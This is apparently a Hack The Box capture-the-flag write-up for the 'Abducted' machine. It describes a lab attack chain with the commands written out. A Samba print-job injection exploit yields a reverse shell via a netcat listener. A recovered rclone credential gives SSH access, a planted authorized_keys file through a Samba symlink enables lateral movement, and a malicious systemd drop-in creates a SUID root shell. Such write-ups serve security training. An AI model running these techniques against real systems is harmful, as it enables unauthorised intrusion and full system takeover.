Hack The Box: Abducted – Penetration Testing Write-upOverviewThis document outlines the step-by-step penetration testing process used to compromise the "Abducted" machine. The attack chain begins with enumerating a vulnerable Samba printer share to gain an initial shell, recovering stored credentials, and abusing Samba symlinks to move laterally. Finally, root access is achieved by exploiting permissive polkit rules and a writable systemd configuration directory.Step 1: Initial Reconnaissance & ExploitationObjective: Gain an initial foothold on the target server.Vulnerability: CVE-2026-4480 (Samba print %J injection)Explanation: During the reconnaissance phase, a vulnerable Samba service was discovered exposing a printer share (HP-Reception). The CVE-2026-4480 vulnerability allows an attacker to inject malicious commands into the %J (job name) parameter during a print job, resulting in Remote Code Execution (RCE).Execution:Downloaded and extracted the exploit Proof of Concept (PoC):Bashunzip CVE-2026-4480-PoC-main.zip -d ~/HTB/Abducted
Started a local Netcat listener to catch the reverse shell connection (nc -lvnp 443).Ran the exploit script against the target IP (10.129.244.177) passing our local tunneling IP (10.10.16.178):Bashpython3 exploit.py 10.129.244.177 10.10.16.178 443
Result: A print job was successfully submitted, triggering a reverse shell as the nobody user.Step 2: Credential DiscoveryObjective: Escalate from the nobody service account to a standard user.Tool Used: rcloneExplanation: Once on the system, we scoured the filesystem for sensitive files. An rclone (a cloud storage sync tool) configuration file was discovered containing an encrypted password token (HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw) for a user named scott.Execution:Using the rclone reveal command (or offline decryption logic), the token was decrypted to reveal Scott's plaintext password: iXzvcib3SrpZ.Authenticated securely via SSH using the newly discovered credentials:Bashssh scott@10.129.244.177
Result: Successfully logged into the machine as scott.Step 3: Lateral MovementObjective: Move laterally to the user marcus by abusing Samba configuration flaws.Tools Used: smbclient, sshExplanation: We utilized smbclient to enumerate network shares accessible by scott. We discovered a transfer share. This share had a misconfiguration (likely wide-symlinks enabled) that allowed us to access directories outside the intended share—specifically, Marcus's /home/marcus directory. By dropping our own SSH public key into Marcus's authorized_keys file, we can log in as him without needing his password.Execution:Connected to the target's SMB transfer share as Scott:Bashsmbclient //10.129.244.177/transfer -U 'scott%iXzvcib3SrpZ' -m SMB3
Navigated to Marcus's hidden .ssh folder through the symlink bypass and uploaded our local public key (abducted_marcus.pub) to act as his authorized_keys file:Bashsmb: \marcus\.ssh\> put /home/ravi/abducted_marcus.pub authorized_keys
Exited SMB and connected via SSH using our matching private key:Bashssh -i ~/abducted_marcus marcus@10.129.244.177
Result: Successfully accessed the system as marcus (uid=1001).Step 4: Privilege Escalation (Root)Objective: Escalate privileges from marcus to root.Vulnerabilities: Permissive polkit rules & writable systemd drop-in directory.Explanation: Running the id command revealed that marcus belongs to the operators group. In this environment, polkit (an authorization framework) policies were overly permissive, allowing anyone in the operators group to execute systemctl daemon-reload and restart the Samba daemon (smbd) without root authentication. Furthermore, the configuration directory for Samba (/etc/systemd/system/smbd.service.d/) was globally writable. By creating a custom drop-in file, we instructed systemd to run a malicious root command right before starting Samba.Execution:Verified systemd daemon reload works without a password:Bashpkaction --action-id org.freedesktop.systemd1.reload-daemon --verbose
systemctl daemon-reload
Navigated to the writable Samba drop-in directory:Bashcd /etc/systemd/system/smbd.service.d/
Created a configuration file (abducted.conf) that copies the bash executable to /tmp and applies SUID permissions (meaning it will execute as its owner, root):Bashcat > abducted.conf <<'EOF'
[Service]
ExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/abducted-root; chmod 6777 /tmp/abducted-root"
EOF
Reloaded systemd to register our malicious drop-in file and restarted the Samba service to execute it:Bashsystemctl daemon-reload
systemctl restart smbd
Executed the newly created SUID bash binary (using -p to preserve root permissions) and grabbed the root flag:Bash/tmp/abducted-root -p
cat /root/root.txt
Result: root (uid=0) privileges obtained and the machine fully compromised.
